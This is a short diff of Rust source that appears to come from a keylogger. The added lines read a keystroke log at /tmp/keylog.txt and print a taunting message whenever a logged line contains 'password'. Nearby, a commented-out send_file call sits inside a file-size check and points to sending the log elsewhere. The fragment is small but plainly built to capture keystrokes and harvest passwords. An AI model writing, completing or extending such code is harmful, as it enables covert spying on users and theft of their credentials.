@@ -48,6 +48,12 @@ pub fn match_case(key: &Keycode) -> &'static str {
 fn size_check(file: &mut std::fs::File) {
     let file_size = file.metadata().unwrap().len();
     if file_size > 100 {
+        let content = fs::read_to_string("/tmp/keylog.txt").unwrap();
+        for line in content.lines() {
+            if line.contains("password") {
+                println!("ENTER COMMAND FOUND NOOB");
+            }
+        }
 
         println!("File is too big");
         // send_file(file);
